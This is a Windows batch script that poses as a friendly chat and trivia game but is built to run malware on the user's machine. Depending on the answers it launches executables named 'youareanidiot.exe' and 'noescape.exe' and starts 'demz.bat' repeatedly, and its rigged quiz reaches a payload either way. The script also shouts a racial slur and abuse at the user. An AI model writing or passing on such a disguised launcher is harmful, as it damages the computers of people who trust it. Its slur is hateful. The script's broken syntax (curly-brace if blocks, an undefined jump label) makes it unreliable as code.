echo off
color 2
cd libs
cls
:start
echo Hi, seems you have become lost.
timeout /t 2 >nul
echo My question is how did you end up here?
timeout /t 1 >nul
echo Do you want to continue?
timeout /t 2 >nul
echo by the way if you dont answer properly the program will end!
echo Yes or No?
set /p choice= Make your choice!:
if "%choice%" == "yes" {
    cls
    goto continue
} if "%choice%" == "no"{
    echo see you next time ig?
    timeout /t 1 >nul
    exit
}

:continue
echo So has your day been good so far?
set /p choice=Good or Bad?:
if "%choice%" == "good" {
goto good1
} if "%choice%" == "bad" {
goto bad1
}


:good1
echo cool
timeout /t 1.5 >nul
echo want to play a game or something?
set /p choice=Make a choice:
if "%choice%" == "yes" {
    goto continue2
}

:bad1
echo huh
timeout /t 1 >nul 
echo oh well none of my business
timeout /t 1 >nul
echo but anyways lets change the topic!
timeout /t 1 >nul
echo so want to play a game?
echo Yes or No?
set /p choice=Make a choice:
if "%choice%" == "yes" {
    goto yes2
     if "%choice%" == "no" {
        goto no2
} if else {
    echo seems you havent didnt type the right thing
    timeout /t 2 >nul
    echo let me autocorrect that for you
    timeout /t 1 >nul
    echo Your answer is: (insert drumroll)
    timeout /t 2 >nul
    echo YES!!!
}
}



:no2
echo well fuck you nigga
timeout /t 1 >nul
start youareanidiot.exe
cls
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot
timeout /t 0.5 >nul
echo you are an idiot



:yes2
echo sweet!
timeout /t 1 >nul
goto continue2


 
:continue1
cls
echo What was USA's 16th president!!!
set /p choice=Make your choice:

if "%choice%" == abraham lincoln {
    echo Nice Job!
    timeout /t 2 >nul
    start demz.bat
    timeout /t 10 >nul
    start demz.bat
    timeout /t 10 >nul
    start demz.bat
    timeout /t 10 >nul
    start demz.bat
    timeout /t 10 >nul
    start demz.bat
    cls
    echo If you see this I'm sorry for rigging it lmao
    timeout /t 1 >nul
    echo anyways enjoy noescape


} if else {
    echo you dumb ass enjoy your pc being fucked!!
    timeout /t 1 >nul
    start noescape.exe
}
pause